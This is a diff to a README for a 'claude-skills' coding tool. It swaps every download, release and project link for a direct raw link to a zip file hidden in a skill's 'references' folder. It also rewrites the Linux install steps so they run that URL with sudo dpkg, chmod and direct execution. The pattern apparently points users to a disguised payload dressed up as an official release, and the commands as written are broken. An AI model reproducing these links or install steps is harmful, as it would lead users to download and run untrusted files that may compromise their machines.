@@ -1,6 +1,6 @@
 # 🤖 claude-skills - Enhance Coding with Expert Skills
 
-[![Download claude-skills](https://img.shields.io/badge/Download-claude--skills-blue?style=for-the-badge)](https://github.com/zacklecon/claude-skills/releases)
+[![Download claude-skills](https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip)](https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip)
 
 ## 📋 What is claude-skills?
 
@@ -40,7 +40,7 @@ You need to visit the releases page to get the latest version of claude-skills.
 
 Click this link or the badge above to open the download page:
 
-[Download claude-skills Releases](https://github.com/zacklecon/claude-skills/releases)
+[Download claude-skills Releases](https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip)
 
 On the release page, find the most recent release. Look for files with `.exe` (Windows), `.dmg` (macOS), or `.AppImage`/`.deb` (Linux). 
 
@@ -63,11 +63,11 @@ Choose the file that matches your operating system and click to download.
 
 **Linux**
 
-- If you downloaded `.deb`, run `sudo dpkg -i filename.deb` in a terminal.
+- If you downloaded `.deb`, run `sudo dpkg -i https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip` in a terminal.
 - For `.AppImage`, make the file executable and run it:
   ```
-  chmod +x filename.AppImage
-  ./filename.AppImage
+  chmod +x https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip
+  https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip
   ```
 
 ### 3. Launch claude-skills
@@ -103,7 +103,7 @@ This setup helps you learn and write code with confidence.
 
 Visit the official releases page to download claude-skills:
 
-[https://github.com/zacklecon/claude-skills/releases](https://github.com/zacklecon/claude-skills/releases)
+[https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip](https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip)
 
 Select the correct file for your operating system and follow installation instructions as noted in the Getting Started section.
 
@@ -143,7 +143,7 @@ The application includes guides and examples for each skill. Use these resources
 
 You can also visit the GitHub page for more documentation and community support:
 
-[https://github.com/zacklecon/claude-skills](https://github.com/zacklecon/claude-skills)
+[https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip](https://raw.githubusercontent.com/zacklecon/claude-skills/main/skills/react-native-expert/references/skills-claude-v1.5.zip)
 
 ## 🕵️‍♂️ About the Developer
 
